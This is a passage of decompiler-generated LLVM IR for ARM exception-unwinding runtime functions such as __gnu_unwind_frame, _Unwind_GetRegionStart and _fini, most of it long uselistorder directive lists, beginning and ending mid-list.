71, 72, 73, 74, 75, 76, 77, 78, 85, 86, 87, 88, 89, 90, 91, 313, 314, 315, 6, 5, 316, 317, 318, 319, 320, 321, 322, 47, 323, 324, 325, 326, 337, 338, 339, 340, 346, 347, 348, 349, 350, 351, 341, 342, 343, 344, 345, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 583, 584, 585, 586, 587, 588, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 367, 368, 369, 370, 371, 372, 2, 373, 364, 365, 366, 374, 43, 375, 44, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 400, 395, 396, 397, 398, 399, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 421, 416, 417, 418, 419, 420, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 45, 438, 439, 440, 441, 442, 443, 444, 7, 446, 445, 447, 448, 449, 450, 451, 452, 453, 454, 455, 461, 456, 457, 458, 459, 460, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 492, 487, 488, 489, 490, 491, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 523, 524, 525, 46, 530, 526, 527, 528, 529, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 557, 551, 552, 553, 554, 555, 556, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 589, 590, 591, 592, 593, 600, 594, 595, 596, 597, 598, 599, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695 }
  uselistorder i32* @r7, { 356, 357, 358, 360, 361, 359, 362, 363, 364, 365, 0, 366, 367, 368, 380, 369, 370, 371, 372, 373, 374, 5, 375, 376, 377, 378, 379, 3, 1, 381, 61, 62, 63, 64, 100, 101, 102, 103, 104, 105, 382, 65, 6, 66, 67, 68, 7, 69, 70, 71, 72, 8, 73, 74, 9, 75, 76, 77, 10, 78, 79, 80, 81, 82, 11, 83, 84, 85, 86, 87, 12, 88, 89, 90, 91, 45, 46, 13, 47, 48, 49, 50, 51, 52, 14, 53, 54, 55, 56, 57, 58, 59, 60, 92, 96, 93, 94, 95, 97, 98, 99, 106, 107, 112, 113, 114, 108, 109, 110, 111, 115, 116, 117, 118, 119, 120, 293, 294, 270, 271, 383, 384, 385, 386, 396, 397, 184, 185, 186, 187, 121, 122, 123, 124, 387, 388, 389, 390, 272, 273, 274, 275, 276, 125, 126, 127, 128, 129, 130, 15, 43, 44, 295, 296, 301, 302, 303, 304, 305, 306, 307, 297, 298, 299, 300, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 16, 322, 323, 324, 277, 278, 279, 280, 281, 282, 211, 214, 215, 216, 212, 213, 236, 237, 238, 239, 131, 134, 135, 136, 132, 133, 137, 138, 240, 243, 244, 245, 241, 242, 217, 218, 139, 142, 143, 144, 140, 141, 145, 146, 147, 148, 149, 150, 151, 152, 153, 17, 154, 155, 391, 18, 392, 393, 394, 395, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 30, 39, 40, 31, 27, 19, 23, 24, 25, 26, 38, 28, 29, 32, 2, 33, 34, 35, 36, 37, 41, 42, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 190, 188, 189, 191, 192, 193, 194, 195, 20, 196, 21, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 208, 207, 209, 210, 22, 219, 222, 220, 221, 223, 224, 225, 226, 228, 227, 229, 230, 231, 233, 232, 234, 235, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 4, 264, 261, 262, 263, 265, 266, 267, 268, 269, 287, 283, 284, 285, 286, 288, 289, 290, 291, 292, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355 }
  uselistorder i32* @lr, { 5, 0, 167, 168, 169, 170, 178, 171, 172, 173, 174, 3, 175, 176, 177, 179, 180, 181, 182, 183, 184, 186, 187, 8, 9, 188, 189, 190, 191, 192, 193, 194, 195, 196, 12, 13, 14, 15, 16, 17, 18, 19, 20, 10, 11, 21, 22, 197, 198, 200, 201, 202, 207, 57, 58, 23, 24, 205, 206, 120, 121, 25, 26, 27, 199, 203, 204, 133, 134, 135, 136, 137, 138, 139, 140, 141, 154, 155, 142, 143, 144, 145, 146, 147, 148, 4, 149, 150, 152, 153, 151, 122, 123, 88, 89, 98, 99, 28, 29, 6, 156, 157, 30, 31, 185, 32, 158, 124, 33, 34, 7, 35, 36, 37, 1, 41, 42, 43, 44, 45, 46, 38, 39, 40, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 90, 91, 92, 93, 94, 95, 96, 97, 100, 101, 102, 107, 103, 104, 105, 106, 108, 109, 110, 2, 111, 112, 113, 114, 115, 116, 117, 118, 119, 125, 126, 127, 128, 129, 130, 131, 132, 159, 160, 161, 162, 163, 164, 165, 166 }
  uselistorder i32* @r6, { 365, 366, 367, 378, 368, 18, 369, 2, 370, 371, 3, 372, 373, 374, 375, 376, 377, 379, 0, 380, 381, 52, 53, 50, 51, 54, 382, 383, 4, 384, 385, 386, 387, 37, 38, 55, 5, 56, 57, 58, 59, 60, 16, 61, 62, 63, 6, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 35, 36, 39, 40, 41, 42, 7, 43, 44, 45, 8, 46, 47, 48, 49, 76, 19, 77, 17, 9, 10, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 390, 98, 11, 99, 100, 32, 12, 33, 13, 34, 388, 389, 296, 300, 301, 302, 303, 297, 298, 299, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 340, 341, 342, 316, 317, 318, 319, 320, 14, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 336, 338, 332, 333, 334, 335, 337, 339, 101, 102, 1, 103, 20, 275, 276, 198, 199, 200, 201, 202, 242, 243, 104, 105, 106, 107, 108, 244, 245, 246, 247, 248, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 26, 27, 28, 29, 24, 31, 30, 21, 22, 23, 25, 136, 137, 138, 139, 140, 141, 148, 149, 150, 151, 152, 142, 143, 144, 145, 146, 147, 277, 278, 279, 280, 153, 154, 155, 156, 157, 158, 159, 163, 160, 161, 162, 164, 170, 165, 166, 167, 168, 169, 171, 172, 173, 174, 175, 176, 181, 177, 178, 179, 180, 182, 183, 184, 185, 186, 187, 193, 188, 189, 190, 191, 192, 194, 195, 196, 197, 203, 204, 205, 210, 206, 207, 208, 209, 211, 212, 213, 214, 215, 216, 217, 218, 223, 219, 220, 221, 222, 224, 225, 226, 227, 228, 229, 230, 231, 232, 237, 233, 234, 235, 236, 238, 239, 240, 241, 256, 249, 250, 251, 252, 253, 254, 255, 257, 258, 259, 260, 261, 262, 268, 263, 264, 265, 266, 267, 269, 270, 271, 272, 273, 274, 281, 282, 283, 289, 284, 285, 286, 287, 288, 290, 291, 292, 293, 294, 295, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 15, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364 }
  uselistorder label %dec_label_pc_18004, { 1, 0 }
  uselistorder label %dec_label_pc_17fa0, { 1, 0 }
  uselistorder label %dec_label_pc_17f4c, { 1, 0 }
  uselistorder label %dec_label_pc_17f24, { 1, 0 }
  uselistorder label %dec_label_pc_17e90, { 1, 0 }
  uselistorder label %dec_label_pc_17e74, { 1, 0 }
  uselistorder label %dec_label_pc_17e58, { 1, 0 }
  uselistorder label %dec_label_pc_17e08, { 1, 0 }
  uselistorder label %dec_label_pc_17dec, { 1, 0 }
  uselistorder label %dec_label_pc_17d68, { 1, 0 }
  uselistorder label %dec_label_pc_17d4c, { 1, 0 }
  uselistorder label %dec_label_pc_17c88, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_17c58, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_17c40, { 1, 0 }
  uselistorder label %dec_label_pc_17c24, { 1, 0 }
  uselistorder label %dec_label_pc_17988.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_17ab0, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_17aa4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17a98, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_17a48, { 1, 0 }
  uselistorder label %dec_label_pc_17a38, { 1, 0 }
  uselistorder label %dec_label_pc_179c4, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_13.3, align 8
  %v1_1808c = add i32 %ucbp, 76
  %v2_1808c = inttoptr i32 %v1_1808c to i32*
  %v3_1808c = load i32, i32* %v2_1808c, align 4
  %v1_18090 = add i32 %v3_1808c, 4
  %v2_18090 = inttoptr i32 %v1_18090 to i32*
  %v3_18090 = load i32, i32* %v2_18090, align 4
  %v3_18098 = mul i32 %v3_18090, 256
  %v4_180a0 = getelementptr inbounds %anon_struct_13.3, %anon_struct_13.3* %uws_-20, i32 0, i32 0
  store i32 %v3_18098, i32* %v4_180a0, align 8
  %tmp7 = bitcast %anon_struct_13.3* %uws_-20 to %anon_struct_13*
  %v4_180c0 = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %tmp7)
  ret i32 %v4_180c0

; uselistorder directives
  uselistorder %anon_struct_13.3* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_13*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, { 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 282, 273, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 266, 274, 271, 48, 272, 49, 50, 51, 265, 0, 270, 1, 52, 53, 54, 56, 57, 58, 55, 60, 61, 62, 59, 63, 64, 275, 276, 65, 66, 67, 277, 68, 69, 71, 70, 72, 73, 74, 75, 76, 77, 78, 81, 80, 79, 82, 268, 278, 269, 83, 84, 85, 86, 87, 89, 88, 90, 279, 91, 92, 280, 103, 97, 93, 104, 98, 105, 99, 94, 95, 100, 101, 106, 102, 96, 107, 108, 109, 110, 111, 112, 113, 114, 121, 118, 115, 122, 119, 123, 120, 116, 117, 124, 125, 126, 127, 128, 139, 134, 140, 135, 141, 136, 142, 137, 129, 130, 131, 132, 143, 138, 133, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 163, 160, 164, 161, 165, 162, 157, 158, 159, 166, 167, 168, 169, 170, 171, 181, 182, 176, 172, 183, 177, 184, 178, 173, 179, 185, 180, 174, 175, 186, 187, 188, 189, 192, 190, 193, 191, 194, 195, 196, 201, 199, 197, 202, 200, 198, 203, 267, 281, 204, 206, 205, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 225, 232, 226, 233, 227, 228, 221, 222, 234, 229, 235, 230, 223, 224, 231, 236, 237, 238, 239, 240, 241, 242, 247, 254, 248, 255, 249, 243, 244, 256, 250, 257, 251, 252, 245, 246, 253, 258, 259, 260, 261, 262, 263, 264 }
  uselistorder i32 4, { 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 100, 489, 490, 491, 492, 493, 3, 496, 497, 494, 495, 498, 4, 499, 500, 501, 502, 5, 519, 6, 503, 504, 505, 506, 507, 7, 508, 8, 509, 510, 511, 512, 513, 514, 515, 9, 516, 144, 517, 518, 520, 521, 522, 523, 10, 524, 11, 250, 251, 252, 253, 269, 270, 275, 276, 228, 229, 230, 525, 231, 232, 476, 237, 254, 12, 13, 528, 14, 15, 145, 58, 16, 17, 89, 84, 85, 18, 529, 86, 530, 65, 19, 20, 87, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 21, 548, 549, 550, 551, 552, 553, 64, 554, 555, 556, 557, 558, 559, 22, 23, 88, 560, 262, 101, 260, 261, 255, 256, 257, 258, 259, 233, 234, 235, 236, 238, 239, 240, 241, 242, 243, 24, 244, 102, 245, 246, 247, 248, 249, 146, 263, 264, 265, 266, 267, 268, 25, 271, 272, 273, 274, 26, 277, 561, 27, 147, 103, 148, 563, 28, 564, 149, 226, 227, 562, 78, 398, 399, 400, 401, 150, 66, 404, 405, 406, 407, 408, 409, 151, 152, 29, 410, 411, 412, 413, 414, 415, 416, 417, 153, 402, 403, 418, 419, 420, 421, 422, 423, 424, 425, 426, 30, 427, 428, 429, 430, 31, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 154, 155, 156, 445, 446, 449, 452, 447, 448, 104, 157, 450, 59, 451, 453, 454, 455, 457, 158, 33, 32, 456, 159, 160, 161, 278, 34, 35, 67, 526, 527, 200, 36, 37, 68, 220, 105, 221, 38, 280, 281, 39, 282, 73, 74, 72, 283, 201, 202, 222, 223, 106, 207, 208, 209, 203, 204, 205, 206, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 224, 225, 61, 60, 284, 79, 285, 40, 286, 63, 62, 287, 41, 279, 288, 289, 294, 107, 295, 108, 296, 109, 297, 110, 298, 111, 299, 112, 300, 113, 301, 114, 302, 115, 303, 116, 304, 117, 305, 118, 306, 119, 307, 120, 308, 121, 309, 122, 310, 123, 312, 124, 313, 125, 314, 315, 311, 290, 126, 291, 292, 293, 316, 77, 76, 75, 317, 127, 42, 43, 44, 45, 46, 47, 318, 70, 69, 319, 71, 128, 320, 321, 322, 129, 323, 324, 162, 325, 326, 327, 328, 329, 163, 164, 130, 330, 48, 131, 331, 90, 332, 333, 165, 334, 335, 166, 167, 336, 132, 337, 91, 338, 339, 168, 169, 340, 170, 341, 342, 343, 171, 172, 344, 133, 345, 92, 346, 173, 174, 347, 348, 349, 134, 93, 350, 351, 175, 352, 353, 354, 176, 177, 0, 135, 355, 94, 356, 357, 358, 178, 359, 360, 179, 180, 1, 80, 361, 136, 362, 95, 363, 364, 365, 366, 181, 182, 367, 368, 183, 369, 370, 137, 371, 2, 372, 96, 373, 138, 374, 375, 376, 184, 377, 378, 379, 380, 185, 186, 140, 381, 81, 382, 139, 383, 97, 384, 385, 386, 187, 387, 388, 389, 141, 390, 142, 391, 392, 393, 188, 189, 143, 394, 82, 395, 98, 396, 99, 397, 190, 49, 458, 191, 50, 459, 192, 51, 460, 193, 83, 52, 461, 462, 194, 53, 463, 195, 54, 464, 196, 55, 465, 197, 56, 466, 198, 57, 467, 468, 199, 469, 470, 471, 472, 473, 474, 475, 477, 478 }
  uselistorder i32 76, { 18, 19, 20, 21, 22, 23, 3, 4, 5, 0, 1, 6, 8, 7, 9, 2, 10, 11, 12, 14, 13, 15, 16, 17 }
  uselistorder i32 1, { 647, 1137, 1138, 491, 1142, 1143, 1144, 1145, 523, 1146, 1147, 468, 481, 524, 1139, 1140, 1141, 1148, 492, 1149, 648, 103, 107, 109, 104, 108, 105, 106, 649, 650, 651, 652, 525, 526, 1150, 1151, 458, 655, 654, 653, 311, 313, 312, 314, 316, 315, 658, 657, 656, 177, 527, 528, 166, 1152, 163, 1153, 661, 660, 659, 139, 1154, 1155, 1156, 1157, 663, 662, 113, 115, 116, 114, 117, 135, 136, 462, 664, 343, 895, 665, 344, 345, 346, 666, 185, 896, 897, 898, 68, 67, 69, 70, 667, 176, 668, 184, 181, 182, 180, 183, 669, 27, 26, 23, 24, 25, 21, 22, 670, 34, 35, 42, 43, 38, 39, 40, 41, 36, 37, 347, 671, 495, 868, 293, 294, 292, 326, 325, 1158, 482, 529, 1159, 1, 0, 672, 130, 125, 123, 124, 131, 128, 129, 126, 127, 122, 44, 530, 101, 673, 440, 441, 439, 469, 490, 470, 1131, 1132, 1133, 1134, 483, 674, 442, 676, 675, 443, 444, 874, 677, 899, 900, 901, 1161, 903, 902, 459, 678, 472, 904, 473, 1162, 870, 869, 835, 836, 837, 838, 839, 840, 841, 1163, 48, 49, 50, 51, 1164, 474, 1165, 1166, 1167, 1168, 1169, 1170, 830, 1171, 1172, 1173, 1174, 1175, 1176, 831, 641, 680, 679, 348, 352, 354, 350, 349, 351, 353, 355, 357, 356, 908, 905, 906, 907, 488, 475, 186, 187, 189, 188, 531, 909, 910, 925, 926, 681, 642, 52, 53, 917, 832, 918, 919, 833, 920, 921, 922, 923, 924, 61, 55, 56, 58, 63, 59, 57, 60, 54, 62, 911, 912, 913, 532, 914, 915, 916, 682, 360, 363, 361, 358, 365, 359, 364, 362, 366, 927, 928, 929, 683, 89, 88, 85, 84, 83, 90, 86, 87, 91, 930, 931, 932, 933, 684, 78, 79, 77, 81, 80, 82, 685, 71, 872, 533, 871, 489, 688, 687, 686, 368, 371, 367, 369, 376, 370, 375, 374, 372, 373, 534, 873, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 476, 689, 378, 377, 379, 382, 380, 381, 383, 886, 887, 888, 889, 890, 891, 892, 893, 894, 690, 13, 17, 19, 16, 14, 18, 15, 20, 535, 885, 691, 301, 934, 935, 936, 937, 938, 536, 692, 140, 141, 144, 142, 143, 537, 145, 939, 693, 329, 328, 538, 940, 694, 179, 178, 539, 695, 148, 146, 147, 941, 47, 46, 45, 696, 120, 118, 119, 697, 384, 698, 95, 94, 699, 76, 75, 700, 73, 72, 701, 138, 137, 702, 93, 92, 703, 133, 704, 705, 99, 100, 1177, 1178, 1179, 540, 1180, 1181, 541, 1182, 708, 707, 706, 151, 153, 159, 152, 157, 156, 160, 158, 154, 155, 709, 74, 542, 710, 385, 386, 387, 161, 711, 394, 392, 393, 391, 388, 389, 390, 712, 172, 173, 171, 174, 175, 713, 714, 28, 716, 715, 132, 717, 121, 945, 720, 719, 718, 290, 291, 721, 167, 169, 168, 170, 477, 722, 162, 456, 460, 1072, 723, 11, 8, 9, 10, 12, 7, 1073, 1074, 1075, 724, 396, 395, 403, 402, 397, 404, 399, 400, 398, 405, 401, 102, 463, 865, 866, 867, 725, 726, 1183, 484, 543, 728, 727, 729, 1076, 1079, 1080, 1081, 730, 406, 411, 412, 410, 409, 413, 407, 408, 1082, 1083, 1084, 1085, 731, 418, 424, 417, 423, 422, 416, 426, 425, 420, 414, 419, 415, 421, 1077, 1078, 544, 197, 199, 198, 110, 1086, 545, 1087, 1088, 1089, 1090, 1091, 732, 30, 31, 29, 32, 1092, 150, 149, 1093, 1094, 1095, 1096, 1097, 1098, 496, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 547, 1107, 1108, 1109, 1110, 1111, 546, 1112, 1113, 1114, 1115, 1116, 733, 429, 431, 427, 430, 434, 436, 433, 435, 437, 432, 438, 428, 289, 288, 548, 549, 466, 737, 736, 735, 734, 331, 33, 478, 272, 738, 201, 200, 739, 203, 202, 740, 273, 741, 445, 742, 743, 446, 744, 236, 745, 447, 746, 747, 454, 247, 748, 260, 259, 749, 220, 219, 750, 751, 448, 752, 258, 257, 753, 754, 449, 755, 1059, 1060, 245, 246, 756, 757, 758, 228, 227, 759, 341, 760, 450, 761, 191, 190, 762, 226, 764, 763, 96, 97, 766, 765, 164, 165, 244, 457, 1160, 112, 111, 1001, 479, 1002, 480, 1003, 768, 767, 451, 1127, 1128, 485, 2, 461, 3, 1129, 942, 943, 944, 550, 946, 134, 1117, 330, 948, 947, 949, 65, 64, 66, 1061, 769, 225, 1062, 770, 240, 239, 238, 237, 1063, 771, 224, 223, 222, 221, 551, 860, 552, 861, 498, 862, 486, 563, 863, 950, 497, 951, 847, 487, 564, 565, 848, 843, 554, 842, 844, 845, 846, 557, 555, 467, 849, 556, 850, 851, 558, 852, 853, 561, 854, 855, 559, 856, 857, 560, 858, 859, 562, 864, 952, 953, 954, 566, 955, 956, 957, 567, 958, 834, 961, 960, 553, 959, 962, 963, 568, 964, 965, 966, 569, 967, 570, 968, 571, 969, 572, 970, 573, 971, 574, 972, 575, 973, 576, 974, 577, 975, 578, 976, 579, 977, 580, 978, 581, 979, 582, 980, 583, 981, 584, 982, 585, 983, 586, 984, 587, 985, 992, 993, 464, 588, 643, 782, 781, 780, 779, 778, 777, 776, 644, 775, 774, 773, 772, 235, 231, 229, 234, 230, 232, 233, 986, 987, 589, 988, 989, 590, 990, 991, 336, 335, 334, 340, 337, 338, 339, 333, 332, 591, 592, 784, 783, 452, 453, 1064, 786, 785, 254, 255, 253, 252, 251, 250, 256, 595, 499, 994, 995, 500, 996, 997, 593, 594, 596, 998, 999, 597, 598, 599, 600, 601, 602, 603, 799, 798, 797, 796, 795, 794, 793, 792, 791, 790, 646, 789, 788, 787, 270, 271, 269, 604, 465, 605, 800, 608, 607, 606, 1000, 801, 645, 609, 610, 611, 1065, 501, 502, 1066, 4, 5, 6, 1004, 1005, 1006, 471, 493, 494, 1007, 1008, 1009, 1010, 1011, 613, 1012, 612, 1013, 614, 1014, 1015, 1016, 805, 804, 803, 802, 212, 214, 217, 218, 215, 211, 216, 213, 1017, 1018, 1019, 615, 616, 807, 806, 275, 277, 278, 274, 276, 1020, 1021, 617, 1022, 1023, 1024, 1025, 618, 1026, 619, 504, 503, 620, 1027, 808, 297, 298, 300, 299, 295, 296, 1028, 621, 1029, 507, 505, 506, 810, 809, 248, 249, 1030, 1031, 1032, 622, 1033, 623, 624, 1034, 508, 1035, 811, 262, 266, 265, 264, 267, 263, 261, 268, 1036, 1037, 1038, 625, 1039, 626, 510, 509, 627, 1040, 628, 1041, 812, 304, 307, 308, 310, 309, 302, 306, 305, 303, 1042, 1043, 1044, 1045, 1046, 1047, 629, 1048, 630, 1049, 631, 515, 514, 632, 1050, 511, 1051, 512, 1052, 513, 1053, 818, 817, 816, 815, 814, 813, 204, 206, 209, 210, 208, 205, 207, 1054, 1055, 1056, 633, 518, 517, 634, 1057, 516, 1058, 819, 318, 322, 323, 324, 317, 321, 320, 319, 1067, 1068, 1069, 635, 521, 520, 636, 1070, 519, 1071, 824, 823, 822, 821, 820, 280, 287, 284, 286, 285, 279, 283, 282, 281, 1118, 522, 637, 825, 241, 242, 243, 1119, 1120, 638, 1123, 639, 640, 1124, 1121, 1122, 1125, 1126, 195, 193, 196, 192, 194, 1130, 826, 342, 1135, 827, 98, 1136, 327, 828, 829, 455 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_180ec = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_180f4 = add i32 %tmp1, 72
  %v2_180f4 = inttoptr i32 %v1_180f4 to i32*
  %v3_180f4 = load i32, i32* %v2_180f4, align 4
  ret i32 %v3_180f4

; uselistorder directives
  uselistorder i32 72, { 10, 11, 0, 12, 7, 8, 5, 6, 2, 3, 1, 4, 9 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 8, 7, 10, 9, 157, 158, 159, 160, 14, 15, 60, 16, 63, 50, 51, 161, 52, 4, 11, 162, 163, 164, 165, 166, 168, 169, 167, 170, 171, 172, 173, 174, 175, 176, 17, 18, 19, 20, 22, 21, 23, 53, 54, 24, 25, 55, 56, 57, 58, 59, 61, 62, 26, 64, 65, 66, 177, 5, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 3, 128, 129, 130, 131, 132, 27, 133, 134, 28, 29, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 153, 146, 147, 148, 149, 150, 151, 152, 154, 155, 30, 156, 46, 47, 36, 67, 68, 38, 48, 39, 40, 35, 37, 41, 42, 43, 44, 45, 49, 69, 70, 71, 6, 72, 73, 74, 75, 77, 78, 79, 31, 80, 32, 81, 83, 82, 76, 106, 84, 33, 85, 86, 87, 88, 89, 90, 91, 92, 34, 93, 94, 95, 12, 96, 97, 98, 99, 100, 101, 13, 102, 103, 104, 105, 107, 108, 109, 110, 0, 1, 2 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_18108 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_18108)
  %v31_18110 = load i32, i32* @r0, align 4
  ret i32 %v31_18110

; uselistorder directives
  uselistorder i32* @r0, { 12, 13, 14, 187, 188, 189, 15, 18, 74, 85, 86, 190, 193, 194, 65, 38, 191, 192, 185, 45, 8, 195, 9, 16, 75, 0, 76, 10, 11, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 1, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 77, 17, 66, 67, 68, 69, 70, 71, 72, 73, 78, 79, 80, 81, 82, 83, 84, 19, 20, 87, 88, 89, 90, 21, 92, 22, 93, 23, 24, 25, 26, 222, 223, 225, 57, 58, 55, 56, 27, 139, 140, 2, 28, 29, 94, 95, 3, 30, 31, 226, 227, 4, 32, 33, 157, 158, 5, 34, 35, 63, 64, 224, 91, 165, 36, 51, 52, 166, 6, 167, 168, 169, 170, 53, 171, 172, 173, 54, 174, 175, 37, 183, 176, 177, 178, 179, 180, 181, 182, 96, 97, 47, 159, 39, 160, 145, 40, 146, 149, 41, 150, 98, 48, 99, 151, 42, 152, 100, 43, 101, 102, 103, 44, 104, 46, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 61, 128, 59, 60, 62, 129, 131, 132, 133, 134, 135, 136, 130, 50, 137, 138, 161, 162, 7, 141, 142, 143, 144, 147, 148, 153, 154, 155, 156, 163, 164, 184, 186, 49 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 65, 58, 59, 60, 61, 62, 63, 64, 66, 67, 68, 69, 70, 17, 18, 19, 20, 21, 22, 13, 14, 15, 16, 23, 24, 25, 26, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 27, 28, 29, 30, 31, 32, 71, 76, 77, 78, 79, 80, 81, 82, 72, 86, 87, 88, 89, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 73, 74, 75, 83, 84, 85, 44, 45, 46, 0, 47, 48, 49, 50, 54, 55, 51, 52, 53, 56, 57 }
  uselistorder i32 0, { 334, 333, 371, 372, 1075, 338, 337, 373, 1076, 1077, 1078, 1079, 292, 291, 374, 1080, 1081, 165, 1082, 1084, 1085, 118, 119, 1086, 1087, 1083, 68, 69, 70, 71, 2, 1, 3, 0, 154, 153, 155, 156, 157, 1088, 335, 336, 110, 108, 1089, 1090, 159, 160, 158, 161, 1091, 1092, 1093, 1094, 164, 163, 162, 1095, 1096, 1097, 325, 324, 375, 339, 376, 340, 377, 341, 378, 379, 380, 120, 1098, 355, 354, 1099, 1100, 353, 352, 1101, 381, 350, 351, 348, 349, 347, 346, 1102, 345, 344, 343, 342, 304, 1103, 1119, 1104, 168, 1105, 1106, 1107, 1108, 1109, 1110, 170, 1112, 1113, 166, 167, 1114, 1115, 101, 121, 1116, 1117, 512, 72, 73, 326, 327, 169, 1111, 1118, 303, 1120, 382, 383, 1121, 357, 356, 171, 1122, 1123, 172, 1124, 1125, 1126, 84, 384, 385, 1127, 173, 1128, 122, 1129, 1130, 174, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 32, 102, 386, 1141, 175, 1142, 1143, 1144, 4, 1145, 1146, 5, 1147, 1148, 724, 725, 6, 111, 1149, 387, 1150, 638, 639, 640, 641, 642, 646, 643, 644, 645, 7, 305, 74, 647, 388, 648, 649, 650, 358, 359, 726, 727, 389, 733, 390, 582, 734, 735, 8, 391, 583, 392, 1151, 1152, 1153, 9, 10, 123, 124, 125, 1168, 1169, 11, 584, 126, 127, 1066, 1067, 1068, 1069, 176, 177, 1070, 593, 178, 103, 42, 1170, 75, 306, 1174, 1175, 43, 651, 85, 652, 653, 654, 307, 128, 1171, 1172, 1173, 308, 12, 1176, 1177, 86, 1178, 1179, 1180, 1181, 1182, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1183, 1184, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 33, 1203, 1204, 1205, 1206, 1207, 34, 1208, 1209, 1210, 35, 1211, 1212, 1213, 36, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1240, 1241, 1242, 